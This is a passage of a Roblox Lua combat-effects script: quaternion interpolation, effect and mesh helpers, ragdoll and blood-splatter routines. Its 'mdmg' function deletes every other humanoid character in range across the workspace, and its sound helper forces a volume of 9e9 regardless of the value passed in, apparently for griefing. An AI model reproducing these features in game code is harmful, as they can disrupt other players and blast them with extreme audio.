						if trace > 0 then 
							local s = math.sqrt(1 + trace)
							local recip = 0.5/s
							return (m21 - m12) * recip,(m02 - m20) * recip,(m10 - m01) * recip,s * 0.5
						else
							local i = 0
							if m11 > m00 then
								i = 1
							end
							if m22 > (i == 0 and m00 or m11) then
								i = 2
							end
							if i == 0 then
								local s = math.sqrt(m00 - m11 - m22 + 1)
								local recip = 0.5/s
								return 0.5 * s,(m10 + m01) * recip,(m20 + m02) * recip,(m21 - m12) * recip
							elseif i == 1 then
								local s = math.sqrt(m11 - m22 - m00 + 1)
								local recip = 0.5/s
								return (m01 + m10) * recip,0.5 * s,(m21 + m12) * recip,(m02 - m20) * recip
							elseif i == 2 then
								local s = math.sqrt(m22 - m00 - m11 + 1)
								local recip = 0.5/s return (m02 + m20) * recip,(m12 + m21) * recip,0.5 * s,(m10 - m01) * recip
							end
						end
					end

					function QTCF(px,py,pz,x,y,z,w)
						local xs,ys,zs = x + x,y + y,z + z
						local wx,wy,wz = w * xs,w * ys,w * zs
						local xx = x * xs
						local xy = x * ys
						local xz = x * zs
						local yy = y * ys
						local yz = y * zs
						local zz = z * zs
						return CFrame.new(px,py,pz,1 - (yy + zz),xy - wz,xz + wy,xy + wz,1 - (xx + zz),yz - wx,xz - wy,yz + wx,1 - (xx + yy))
					end

					function QS(a,b,t)
						local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
						local startInterp,finishInterp;
						if cosTheta >= 0.0001 then
							if (1 - cosTheta) > 0.0001 then
								local theta = math.acos(cosTheta)
								local invSinTheta = 1/math.sin(theta)
								startInterp = math.sin((1 - t) * theta) * invSinTheta
								finishInterp = math.sin(t * theta) * invSinTheta
							else
								startInterp = 1 - t
								finishInterp = t
							end
						else
							if (1 + cosTheta) > 0.0001 then
								local theta = math.acos(-cosTheta)
								local invSinTheta = 1/math.sin(theta)
								startInterp = math.sin((t - 1) * theta) * invSinTheta
								finishInterp = math.sin(t * theta) * invSinTheta
							else
								startInterp = t - 1
								finishInterp = t
							end
						end
						return a[1] * startInterp + b[1] * finishInterp,a[2] * startInterp + b[2] * finishInterp,a[3] * startInterp + b[3] * finishInterp,a[4] * startInterp + b[4] * finishInterp
					end

					function Clerp(a, b, t)
						local qa = {QFCF(a)}
						local qb = {QFCF(b)}
						local ax,ay,az = a.x,a.y,a.z
						local bx,by,bz = b.x,b.y,b.z
						local _t = 1 - t
						return QTCF(_t * ax + t * bx,_t * ay + t * by,_t * az + t * bz,QS(qa,qb,t))
					end

					function mdmg(centerofeffect,range)
						pcall(function()
							for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
								if not v:IsDescendantOf(Character) and v:IsA("Humanoid") and v.RootPart and (v.RootPart.Position - centerofeffect).Magnitude <= range + v.RootPart.Size.Magnitude then
									local deathp = Instance.new("Part")
									deathp.Anchored = true 
									deathp.Transparency = 1
									deathp.CanCollide = false
									deathp.CFrame = v.RootPart.CFrame
									local bruh = CreateSound(206082273,deathp,5,.75)
									bruh.PlayOnRemove = true
									for i = 1,10 do
										local a = Instance.new("Part")
										a.Name = randomstring()
										a.Anchored = true
										a.Position = deathp.Position
										a.Shape = "Ball"
										a.Color = COLORSHIFT
										a.Material = "Neon"
										a.CastShadow = false
										a.Size = Vector3.new(i*2.5,i*2.5,i*2.5)
										a.CanCollide = false
										a.Transparency = .75
										a.Parent = game:GetService("Workspace")
										game:GetService("Debris"):AddItem(a,1.5-i/10)
										for o = 1,3 do
											local hitm = script.SomeEffectIDK:Clone()
											hitm.Color = COLORSHIFT
											hitm.Trail.Color = ColorSequence.new(COLORSHIFT,Color3.new(1,1,1))
											hitm.attachment.ParticleEmitter.Color = ColorSequence.new(COLORSHIFT,Color3.new(1,1,1))
											hitm.CFrame = a.CFrame * CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))*CFrame.new(0,1,0)
											hitm.Parent = Effects
											hitm.Velocity = CFrame.new(hitm.Position,a.Position).LookVector*250
											game:GetService("Debris"):AddItem(hitm,1.33)						
										end
									end
									deathp.Parent = game:GetService("Workspace")
									pcall(function()
										deathp:Destroy()
									end)
									if v:IsDescendantOf(game) and v.Parent ~= game:GetService("Workspace") and v.Parent ~= game:GetService("Workspace").Terrain then
										v.RootPart:Destroy()
										local maxparent = v
										coroutine.resume(coroutine.create(function()
											local waitthing = 0
											waitthing = waitthing + game:GetService("RunService").Heartbeat:Wait()
										end))
										maxparent:Destroy()
									elseif v:IsDescendantOf(game) then
										v.RootPart:Destroy()
										v:Destroy()
									end
								end
							end
						end)
					end

					function CreateFrame(PARENT, TRANSPARENCY, BORDERSIZEPIXEL, POSITION, SIZE, COLOR, BORDERCOLOR, NAME)
						local frame = IT("Frame")
						frame.BackgroundTransparency = TRANSPARENCY
						frame.BorderSizePixel = BORDERSIZEPIXEL
						frame.Position = POSITION
						frame.Size = SIZE
						frame.BackgroundColor3 = COLOR
						frame.BorderColor3 = BORDERCOLOR
						frame.Name = NAME
						frame.Parent = PARENT
						return frame
					end

					function CreateLabel(PARENT, TEXT, TEXTCOLOR, TEXTFONTSIZE, TEXTFONT, TRANSPARENCY, BORDERSIZEPIXEL, STROKETRANSPARENCY, NAME)
						local label = IT("TextLabel")
						label.BackgroundTransparency = 1
						label.Size = UD2(1, 0, 1, 0)
						label.Position = UD2(0, 0, 0, 0)
						label.TextColor3 = TEXTCOLOR
						label.TextStrokeTransparency = STROKETRANSPARENCY
						label.TextTransparency = TRANSPARENCY
						label.FontSize = TEXTFONTSIZE
						label.Font = TEXTFONT
						label.BorderSizePixel = BORDERSIZEPIXEL
						label.TextScaled = false
						label.Text = TEXT
						label.Name = NAME
						label.Parent = PARENT
						return label
					end

					function NoOutlines(PART)
						PART.TopSurface, PART.BottomSurface, PART.LeftSurface, PART.RightSurface, PART.FrontSurface, PART.BackSurface = 10, 10, 10, 10, 10, 10
					end

					function CreateWeldOrSnapOrMotor(TYPE, PARENT, PART0, PART1, C0, C1)
						local NEWWELD = IT(TYPE)
						NEWWELD.Part0 = PART0
						NEWWELD.Part1 = PART1
						NEWWELD.C0 = C0
						NEWWELD.C1 = C1
						NEWWELD.Parent = PARENT
						return NEWWELD
					end

					local S = IT("Sound")
					function CreateSound(ID, PARENT, VOLUME, PITCH, DOESLOOP)
						local NEWSOUND = nil
						coroutine.resume(coroutine.create(function()
							NEWSOUND = S:Clone()
							NEWSOUND.Parent = PARENT
							NEWSOUND.Volume = 9e9
							NEWSOUND.Pitch = PITCH
							NEWSOUND.SoundId = "http://www.roblox.com/asset/?id="..ID
							NEWSOUND:play()
							if DOESLOOP == true then
								NEWSOUND.Looped = true
							else
								repeat wait(1) until NEWSOUND.Playing == false or NEWSOUND.Parent ~= PARENT
								NEWSOUND:remove()
							end
						end))
						return NEWSOUND
					end

					function CFrameFromTopBack(at, top, back)
						local right = top:Cross(back)
						return CF(at.x, at.y, at.z, right.x, top.x, back.x, right.y, top.y, back.y, right.z, top.z, back.z)
					end

					function nooutline(part)
						part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
					end

					function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
						local fp=it("Part")
						fp.formFactor=formfactor
						fp.Parent=parent
						fp.Reflectance=reflectance
						fp.Transparency=transparency
						fp.CanCollide=false
						fp.Locked=true
						fp.BrickColor=BrickColor.new(tostring(brickcolor))
						fp.Name=name
						fp.Size=size
						fp.Position=Character.Torso.Position
						nooutline(fp)
						fp.Material=material
						fp:BreakJoints()
						return fp
					end

					function mesh(Mesh,part,meshtype,meshid,offset,scale)
						local mesh=it(Mesh)
						mesh.Parent=part
						if Mesh=="SpecialMesh" then
							mesh.MeshType=meshtype
							mesh.MeshId=meshid
						end
						mesh.Offset=offset
						mesh.Scale=scale
						return mesh
					end

					function weld(parent,part0,part1,c0,c1)
						local weld=it("Weld")
						weld.Parent=parent
						weld.Part0=part0
						weld.Part1=part1
						weld.C0=c0
						weld.C1=c1
						return weld
					end

					--WACKYEFFECT({EffectType = "", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = CF(), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,1,1), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
					function WACKYEFFECT(Table)
						local TYPE = (Table.EffectType or "Sphere")
						local SIZE = (Table.Size or VT(1,1,1))
						local ENDSIZE = (Table.Size2 or VT(0,0,0))
						local TRANSPARENCY = (Table.Transparency or 0)
						local ENDTRANSPARENCY = (Table.Transparency2 or 1)
						local CFRAME = (Table.CFrame or Torso.CFrame)
						local MOVEDIRECTION = (Table.MoveToPos or nil)
						local ROTATION1 = (Table.RotationX or 0)
						local ROTATION2 = (Table.RotationY or 0)
						local ROTATION3 = (Table.RotationZ or 0)
						local MATERIAL = (Table.Material or "Neon")
						local COLOR = (Table.Color or C3(1,1,1))
						local TIME = (Table.Time or 45)
						local SOUNDID = (Table.SoundID or nil)
						local SOUNDPITCH = (Table.SoundPitch or nil)
						local SOUNDVOLUME = (Table.SoundVolume or nil)
						coroutine.resume(coroutine.create(function()
							local PLAYSSOUND = false
							local SOUND = nil
							local EFFECT = CreatePart(3, Effects, "Neon", 0, 0, C3(0,0,0), "Effect", VT(1,1,1), true)
							EFFECT.Color = COLORSHIFT
							if SOUNDID ~= nil and SOUNDPITCH ~= nil and SOUNDVOLUME ~= nil then
								PLAYSSOUND = true
								SOUND = CreateSound(SOUNDID, EFFECT, SOUNDVOLUME, SOUNDPITCH, false)
							end
							local MSH = nil
							if TYPE == "Sphere" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "Sphere", "", "", SIZE, VT(0,0,0))
							elseif TYPE == "Block" then
								MSH = IT("BlockMesh",EFFECT)
								MSH.Scale = VT(SIZE.X,SIZE.X,SIZE.X)
							elseif TYPE == "Wave" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "20329976", "", SIZE, VT(0,0,-SIZE.X/8))
							elseif TYPE == "Ring" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "559831844", "", VT(SIZE.X,SIZE.X,0.1), VT(0,0,0))
							elseif TYPE == "Slash" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "662586858", "", VT(SIZE.X/10,0,SIZE.X/10), VT(0,0,0))
							elseif TYPE == "Round Slash" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "662585058", "", VT(SIZE.X/10,0,SIZE.X/10), VT(0,0,0))
							elseif TYPE == "Swirl" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "1051557", "", SIZE, VT(0,0,0))
							elseif TYPE == "Skull" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "4770583", "", SIZE, VT(0,0,0))
							elseif TYPE == "Crystal" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "9756362", "", SIZE, VT(0,0,0))
							end
							if MSH ~= nil then
								local MOVESPEED = nil
								if MOVEDIRECTION ~= nil then
									MOVESPEED = (CFRAME.p - MOVEDIRECTION).Magnitude/TIME
								end
								local GROWTH = SIZE - ENDSIZE
								local TRANS = TRANSPARENCY - ENDTRANSPARENCY
								if TYPE == "Block" then
									EFFECT.CFrame = CFRAME*ANGLES(RAD(MATHR(0,360)),RAD(MATHR(0,360)),RAD(MATHR(0,360)))
								else
									EFFECT.CFrame = CFRAME
								end
								for LOOP = 1, TIME+1 do
									Swait()
									MSH.Scale = MSH.Scale - GROWTH/TIME
									if TYPE == "Wave" then
										MSH.Offset = VT(0,0,-MSH.Scale.X/8)
									end
									EFFECT.Transparency = EFFECT.Transparency - TRANS/TIME
									if TYPE == "Block" then
										EFFECT.CFrame = CFRAME*ANGLES(RAD(MATHR(0,360)),RAD(MATHR(0,360)),RAD(MATHR(0,360)))
									else
										EFFECT.CFrame = EFFECT.CFrame*ANGLES(RAD(ROTATION1),RAD(ROTATION2),RAD(ROTATION3))
									end
									if MOVEDIRECTION ~= nil then
										local ORI = EFFECT.Orientation
										EFFECT.CFrame = CF(EFFECT.Position,MOVEDIRECTION)*CF(0,0,-MOVESPEED)
										EFFECT.Orientation = ORI
									end
								end
								if PLAYSSOUND == false then
									EFFECT:remove()
								else
									SOUND.Stopped:Connect(function()
										EFFECT:remove()
									end)
								end
							else
								if PLAYSSOUND == false then
									EFFECT:remove()
								else
									repeat Swait() until SOUND.Playing == false
									EFFECT:remove()
								end
							end
						end))
					end

					function WACKYEFFECT2(Table)
						local TYPE = Table.EffectType or "Sphere"
						local SIZE = Table.Size or VT(1, 1, 1)
						local ENDSIZE = Table.Size2 or VT(0, 0, 0)
						local TRANSPARENCY = Table.Transparency or 0
						local ENDTRANSPARENCY = Table.Transparency2 or 1
						local CFRAME = Table.CFrame or Torso.CFrame
						local MOVEDIRECTION = Table.MoveToPos or nil
						local ROTATION1 = Table.RotationX or 0
						local ROTATION2 = Table.RotationY or 0
						local ROTATION3 = Table.RotationZ or 0
						local MATERIAL = Table.Material --or "Neon"
						local COLOR = Table.Color or C3(1, 1, 1)
						local TIME = Table.Time or 45
						local SOUNDID = Table.SoundID or nil
						local SOUNDPITCH = Table.SoundPitch or nil
						local SOUNDVOLUME = Table.SoundVolume or nil
						local USEBOOMERANGMATH = Table.UseBoomerangMath or false
						local BOOMERANG = Table.Boomerang or 0
						local SIZEBOOMERANG = Table.SizeBoomerang or 0
						coroutine.resume(coroutine.create(function()
							local PLAYSSOUND = false
							local SOUND = nil
							local EFFECT = CreatePart(3, Effects, "Neon", 0, 0, C3(0,0,0), "Effect", VT(1,1,1), true)
							EFFECT.Color = COLORSHIFT
							if SOUNDID ~= nil and SOUNDPITCH ~= nil and SOUNDVOLUME ~= nil then
								PLAYSSOUND = true
								SOUND = CreateSound(SOUNDID, EFFECT, SOUNDVOLUME, SOUNDPITCH, false)
							end
							local MSH
							if TYPE == "Sphere" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "Sphere", "", "", SIZE, VT(0, 0, 0))
							elseif TYPE == "Block" or TYPE == "Box" then
								MSH = IT("BlockMesh", EFFECT)
								MSH.Scale = SIZE
							elseif TYPE == "Wave" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "20329976", "", SIZE, VT(0, 0, -SIZE.X / 8))
							elseif TYPE == "Ring" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "559831844", "", VT(SIZE.X, SIZE.X, 0.1), VT(0, 0, 0))
							elseif TYPE == "Slash" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "662586858", "", VT(SIZE.X / 10, 0, SIZE.X / 10), VT(0, 0, 0))
							elseif TYPE == "Round Slash" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "662585058", "", VT(SIZE.X / 10, 0, SIZE.X / 10), VT(0, 0, 0))
							elseif TYPE == "Swirl" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "168892432", "", SIZE, VT(0, 0, 0))
							elseif TYPE == "Skull" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "4770583", "", SIZE, VT(0, 0, 0))
							elseif TYPE == "Star" then 
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "2760116123", "", SIZE, VT(0,0,0))   	
							elseif TYPE == "Crystal" then
								MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "450656451", "", SIZE, VT(0, 0, 0))
							end
							coroutine.resume(coroutine.create(function()
								if MSH ~= nil then
									local BOOMR1 = 1 + BOOMERANG / 50
									local BOOMR2 = 1 + SIZEBOOMERANG / 50
									local MOVESPEED = nil
									if MOVEDIRECTION ~= nil then
										MOVESPEED = (CFRAME.p - MOVEDIRECTION).Magnitude/TIME
									end
									local GROWTH
									if USEBOOMERANGMATH == true then
										GROWTH = (SIZE - ENDSIZE) * (BOOMR2 + 1)
									else
										GROWTH = SIZE - ENDSIZE
									end
									local TRANS = TRANSPARENCY - ENDTRANSPARENCY
									if TYPE == "Block" then
										EFFECT.CFrame = CFRAME * ANGLES(RAD(MATHR(0, 360)), RAD(MATHR(0, 360)), RAD(MATHR(0, 360)))
									else
										EFFECT.CFrame = CFRAME
									end
									if USEBOOMERANGMATH == true then
										for LOOP = 1, TIME + 1 do
											Swait()
											MSH.Scale = MSH.Scale - VT(GROWTH.X * (1 - LOOP / TIME * BOOMR2), GROWTH.Y * (1 - LOOP / TIME * BOOMR2), GROWTH.Z * (1 - LOOP / TIME * BOOMR2)) * BOOMR2 / TIME
											if TYPE == "Wave" then
												MSH.Offset = VT(0, 0, -MSH.Scale.Z / 8)
											end
											EFFECT.Transparency = EFFECT.Transparency - TRANS / TIME
											if TYPE == "Block" then
												EFFECT.CFrame = CFRAME * ANGLES(RAD(MATHR(0, 360)), RAD(MATHR(0, 360)), RAD(MATHR(0, 360)))
											else
												EFFECT.CFrame = EFFECT.CFrame * ANGLES(RAD(ROTATION1), RAD(ROTATION2), RAD(ROTATION3))
											end
											if MOVEDIRECTION ~= nil then
												local ORI = EFFECT.Orientation
												EFFECT.CFrame = CF(EFFECT.Position, MOVEDIRECTION) * CF(0, 0, -MOVESPEED * (1 - LOOP / TIME * BOOMR1))
												EFFECT.Orientation = ORI
											end
										end
									else
										for LOOP = 1, TIME + 1 do
											Swait()
											MSH.Scale = MSH.Scale - GROWTH / TIME
											if TYPE == "Wave" then
												MSH.Offset = VT(0, 0, -MSH.Scale.Z / 8)
											end
											EFFECT.Transparency = EFFECT.Transparency - TRANS / TIME
											if TYPE == "Block" then
												EFFECT.CFrame = CFRAME * ANGLES(RAD(MATHR(0, 360)), RAD(MATHR(0, 360)), RAD(MATHR(0, 360)))
											else
												EFFECT.CFrame = EFFECT.CFrame * ANGLES(RAD(ROTATION1), RAD(ROTATION2), RAD(ROTATION3))
											end
											if MOVEDIRECTION ~= nil then
												local ORI = EFFECT.Orientation
												EFFECT.CFrame = CF(EFFECT.Position,MOVEDIRECTION)*CF(0,0,-MOVESPEED)
												EFFECT.Orientation = ORI
											end
										end
									end
									EFFECT.Transparency = 1
									if PLAYSSOUND == false then
										EFFECT:remove()
									else
										repeat
											Swait()
										until EFFECT:FindFirstChildOfClass("Sound") == nil
										EFFECT:remove()
									end
								elseif PLAYSSOUND == false then
									EFFECT:remove()
								else
									repeat
										Swait()
									until EFFECT:FindFirstChildOfClass("Sound") == nil
									EFFECT:remove()
								end
							end))
							return EFFECT
						end))
					end   

					function MakeForm(PART,TYPE)
						if TYPE == "Cyl" then
							local MSH = IT("CylinderMesh",PART)
						elseif TYPE == "Ball" then
							local MSH = IT("SpecialMesh",PART)
							MSH.MeshType = "Sphere"
						elseif TYPE == "Wedge" then
							local MSH = IT("SpecialMesh",PART)
							MSH.MeshType = "Wedge"
						end
					end

					function SpawnTrail(FROM,TO,BIG)
						local TRAIL = CreatePart(3, game:GetService("Workspace"), "Neon", 0, 0.5, "Really red", "Trail", VT(0,0,0))
						MakeForm(TRAIL,"Cyl")
						local DIST = (FROM - TO).Magnitude
						if BIG == true then
							TRAIL.Size = VT(0.5,DIST,0.5)
						else
							TRAIL.Size = VT(0.25,DIST,0.25)
						end
						TRAIL.Name = "Effect"
						TRAIL.CFrame = CF(FROM, TO) * CF(0, 0, -DIST/2) * ANGLES(RAD(90),RAD(0),RAD(0))
						coroutine.resume(coroutine.create(function()
							while true do
								Swait()
								TRAIL.Color = COLORSHIFT
							end
						end))
						coroutine.resume(coroutine.create(function()
							for i = 1, 5 do
								Swait()
								TRAIL.Transparency = TRAIL.Transparency + 0.01
							end
							wait(4.2)
							TRAIL:remove()
						end))
					end
					Debris = game:GetService("Debris")

					function CastProperRay(StartPos, EndPos, Distance, Ignore)
						local DIRECTION = CF(StartPos,EndPos).lookVector
						return Raycast(StartPos, DIRECTION, Distance, Ignore)
					end

					function turnto(position)
						RootPart.CFrame=CFrame.new(RootPart.CFrame.p,VT(position.X,RootPart.Position.Y,position.Z)) * CFrame.new(0, 0, 0)
					end

					local asd = Instance.new("ParticleEmitter")
					asd.Color = ColorSequence.new(Color3.new(0.5, 0, 0), Color3.new(.1, 0, 0))
					asd.LightEmission = .1
					asd.Size = NumberSequence.new(0.2)
					asd.Texture = "http://www.roblox.com/asset/?ID=291880914"
					aaa = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.2),NumberSequenceKeypoint.new(1, 5)})
					bbb = NumberSequence.new({NumberSequenceKeypoint.new(0, 1),NumberSequenceKeypoint.new(0.0636, 0), NumberSequenceKeypoint.new(1, 1)})
					asd.Transparency = bbb
					asd.Size = aaa
					asd.ZOffset = .9
					asd.Acceleration = Vector3.new(0, -5, 0)
					asd.LockedToPart = false
					asd.EmissionDirection = "Back"
					asd.Lifetime = NumberRange.new(1, 2)
					asd.Rotation = NumberRange.new(-100, 100)
					asd.RotSpeed = NumberRange.new(-100, 100)
					asd.Speed = NumberRange.new(2)
					asd.Enabled = false
					asd.VelocitySpread = 10000

					function getbloody(victim,amount)
						local prtcl = asd:Clone()
						prtcl.Parent = victim
						prtcl:Emit(amount)
					end

					local TORSOVELOCITY = 0

					function Ragdoll(Character2,CharTorso)
						local svch = Character2
						local hum = Character2:findFirstChild("Humanoid")
						local q = Character2:GetChildren()
						local CLONE = IT("Model",Effects)
						local DummyHead = nil
						for i = 1,#q do
							if q[i].ClassName ~= "Humanoid" and q[i].ClassName ~= "LocalScript" and q[i].ClassName ~= "Script" and q[i].ClassName ~= "Accessory" and q[i].ClassName ~= "Hat" and q[i].ClassName ~= "Gear" then
								q[i].Parent = CLONE
								if q[i].Name == "Head" then
									DummyHead = CLONE.Head:Clone()
									q[i]:ClearAllChildren()
									q[i].Transparency = 1
								end
							else
								if q[i].ClassName ~= "Humanoid" then
									q[i]:remove()
								end
							end
						end
						local chrclone = CLONE

						for _, c in pairs(Character2:GetChildren()) do
							if c.ClassName == "Accessory" then
								c:remove()
							end
						end

						local ch = chrclone:GetChildren()
						local i
						for i = 1,#ch do
							if ch[i].Name == "THandle1" or ch[i].Name == "THandle2" or ch[i].ClassName == "Script" then
								ch[i]:remove()
							end
						end
						local function Scan(ch)
							local e
							for e = 1,#ch do
								Scan(ch[e]:GetChildren())
								if ch[e].ClassName == "Weld" or ch[e].ClassName == "Motor6D" then
									ch[e]:remove()
								end
							end
						end
						Scan(chrclone:GetChildren())

						local ch = Character2:GetChildren()
						local i
						for i = 1,#ch do
							if ch[i].Name == "THandle1" or ch[i].Name == "THandle2" then
								ch[i]:remove()
							end
						end

						local ch = Character2:GetChildren()
						local i
						for i = 1,#ch do
							if ch[i].ClassName == "Part" or ch[i].ClassName == "Hat" or ch[i].Name == "THandle1" or ch[i].Name == "THandle2" then
								ch[i]:remove()
							end
						end
						Character2 = chrclone
						local Torso2 = Character2.Torso
						local movevector = Vector3.new()

						if Torso2 then
							movevector = CFrame.new(CharTorso.Position,Torso2.Position).lookVector
							local Head = Character2:FindFirstChild("Head")
							if Head then
								local Neck = Instance.new("Weld")
								Neck.Name = "Neck"
								Neck.Part0 = Torso2
								Neck.Part1 = Head
								Neck.C0 = CFrame.new(0, 1.5, 0)
								Neck.C1 = CFrame.new()
								Neck.Parent = Torso2
								Head:ClearAllChildren()
								Head.Transparency = 1

							end
							local Limb = Character2:FindFirstChild("Right Arm")
							if Limb then

								Limb.CFrame = Torso2.CFrame * CFrame.new(1.5, 0, 0)
								local Joint = Instance.new("Glue")
								Joint.Name = "RightShoulder"
								Joint.Part0 = Torso2
								Joint.Part1 = Limb
								Joint.C0 = CFrame.new(1.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
								Joint.C1 = CFrame.new(-0, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
								Joint.Parent = Torso2

								local B = Instance.new("Part")
								B.TopSurface = 0
								B.BottomSurface = 0
								B.formFactor = "Symmetric"
								B.Size = Vector3.new(1, 1, 1)
								B.Transparency = 1
								B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
								B.Parent = Character2
								local W = Instance.new("Weld")
								W.Part0 = Limb
								W.Part1 = B
								W.C0 = CFrame.new(0, -0.5, 0)
								W.Parent = Limb

							end
							local Limb = Character2:FindFirstChild("Left Arm")
							if Limb then

								Limb.CFrame = Torso2.CFrame * CFrame.new(-1.5, 0, 0)
								local Joint = Instance.new("Glue")
								Joint.Name = "LeftShoulder"
								Joint.Part0 = Torso2
								Joint.Part1 = Limb
								Joint.C0 = CFrame.new(-1.5, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
								Joint.C1 = CFrame.new(0, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
								Joint.Parent = Torso2

								local B = Instance.new("Part")
								B.TopSurface = 0
								B.BottomSurface = 0
								B.formFactor = "Symmetric"
								B.Size = Vector3.new(1, 1, 1)
								B.Transparency = 1
								B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
								B.Parent = Character2
								local W = Instance.new("Weld")
								W.Part0 = Limb
								W.Part1 = B
								W.C0 = CFrame.new(0, -0.5, 0)
								W.Parent = Limb

							end
							local Limb = Character2:FindFirstChild("Right Leg")
							if Limb then

								Limb.CFrame = Torso2.CFrame * CFrame.new(0.5, -2, 0)
								local Joint = Instance.new("Glue")
								Joint.Name = "RightHip"
								Joint.Part0 = Torso2
								Joint.Part1 = Limb
								Joint.C0 = CFrame.new(0.5, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
								Joint.C1 = CFrame.new(0, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
								Joint.Parent = Torso2

								local B = Instance.new("Part")
								B.TopSurface = 0
								B.BottomSurface = 0
								B.formFactor = "Symmetric"
								B.Size = Vector3.new(1, 1, 1)
								B.Transparency = 1
								B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
								B.Parent = Character2
								local W = Instance.new("Weld")
								W.Part0 = Limb
								W.Part1 = B
								W.C0 = CFrame.new(0, -0.5, 0)
								W.Parent = Limb

							end
							local Limb = Character2:FindFirstChild("Left Leg")
							if Limb then

								Limb.CFrame = Torso2.CFrame * CFrame.new(-0.5, -2, 0)
								local Joint = Instance.new("Glue")
								Joint.Name = "LeftHip"
								Joint.Part0 = Torso2
								Joint.Part1 = Limb
								Joint.C0 = CFrame.new(-0.5, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
								Joint.C1 = CFrame.new(-0, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
								Joint.Parent = Torso2

								local B = Instance.new("Part")
								B.TopSurface = 0
								B.BottomSurface = 0
								B.formFactor = "Symmetric"
								B.Size = Vector3.new(1, 1, 1)
								B.Transparency = 1
								B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
								B.Parent = Character2
								local W = Instance.new("Weld")
								W.Part0 = Limb
								W.Part1 = B
								W.C0 = CFrame.new(0, -0.5, 0)
								W.Parent = Limb

							end
							--[
							local Bar = Instance.new("Part")
							Bar.TopSurface = 0
							Bar.BottomSurface = 0
							Bar.formFactor = "Symmetric"
							Bar.Size = Vector3.new(1, 1, 1)
							Bar.Transparency = 1
							Bar.CFrame = Torso2.CFrame * CFrame.new(0, 0.5, 0)
							Bar.Parent = Character2
							local Weld = Instance.new("Weld")
							Weld.Part0 = Torso2
							Weld.Part1 = Bar
							Weld.C0 = CFrame.new(0, 0.5, 0)
							Weld.Parent = Torso2
							--]]
						end
						Character2.Parent = Weapon
						if movevector ~= Vector3.new() then
							for i = 1,10 do
								Torso2.Velocity = movevector * 30
							end
						end
						DummyHead.Name = "FakeHead"
						DummyHead.Parent = CLONE
						local BLOOD = CreatePart(3, DummyHead, "Glass", 0, 0, "Maroon", "Blood", VT(0.65,0.25,0.65),false)
						BLOOD.CFrame = DummyHead.CFrame*CF(0,-DummyHead.Size.Y/2,0)
						MakeForm(BLOOD,"Cyl")
						weldBetween(DummyHead,BLOOD)
						local BLOOD = CreatePart(3, Torso2, "Glass", 0, 0, "Maroon", "Blood", VT(0.65,0.2,0.65),false)
						BLOOD.CFrame = Torso2.CFrame*CF(0,Torso2.Size.Y/2,0)
						MakeForm(BLOOD,"Cyl")
						weldBetween(Torso2,BLOOD)
						Character2.Name = "Corpse"
						local hum2 = svch:findFirstChild("Humanoid")

						return Character2,Torso2,DummyHead
					end

					function PuddleOfBlood(Position,MaxDrop,Model,MaxSize)
						local HITFLOOR, HITPOS = Raycast(Position, (CF(Position, Position + VT(0, -1, 0))).lookVector, MaxDrop, Model)
						if HITFLOOR ~= nil then
							if HITFLOOR.Parent ~= Weapon and HITFLOOR.Parent ~= Character then
								if HITFLOOR.Name == "BloodPuddle" then
									local DIST = (Position - HITFLOOR.Position).Magnitude
									if (HITFLOOR.Size.Z <= 5 and HITFLOOR.Size.Z < MaxSize) or (HITFLOOR.Size.Z > 5 and HITFLOOR.Size.Z < MaxSize and DIST < HITFLOOR.Size.Z/3) then
										HITFLOOR.Size = HITFLOOR.Size + VT(0.1,0,0.1)
									end
								else
									if HITFLOOR.Anchored == true then
										local BLOOD = CreatePart(3, Effects, "Glass", 0, 0, "Maroon", "BloodPuddle", VT(1,0,1))
										BLOOD.CFrame = CF(HITPOS)
										MakeForm(BLOOD,"Cyl")
										coroutine.resume(coroutine.create(function()
											Swait(75)
											while true do
												Swait()
												BLOOD.Size = BLOOD.Size - VT(0.02,0,0.02)
												if BLOOD.Size.Z < 0.051 then
													BLOOD:remove()
													break
												end
											end
										end))
									end
								end
							end
						end
					end

					function SprayBlood(POSITION,DIRECTION,BloodSize)
